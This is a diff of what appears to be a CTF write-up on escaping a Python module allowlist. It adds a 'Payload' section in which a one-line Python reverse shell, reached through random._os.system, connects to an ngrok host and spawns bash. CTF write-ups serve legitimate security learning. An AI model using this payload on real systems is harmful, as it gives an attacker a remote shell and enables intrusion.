@@ -21,7 +21,6 @@ ALLOWED_MODULES = {
     'code',
     'codecs',
     'copy',
-    'random
     ...
 }
 ```
@@ -40,6 +39,14 @@ We use reverse shells (`revshells`) to exploit the vulnerability and gain access
 ![RCE](../image/image-2.png)
 
 ---
+
+### Payload
+
+```python
+import random
+print(random._os.system("""export RHOST="0.tcp.ap.ngrok.io";export RPORT=19396;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'"""))
+```
+
 
 ### Key Insight
 This challenge can also be solved by directly reading the `flag.txt` file. The primary reason is that the author made a custom implementation error. 😅
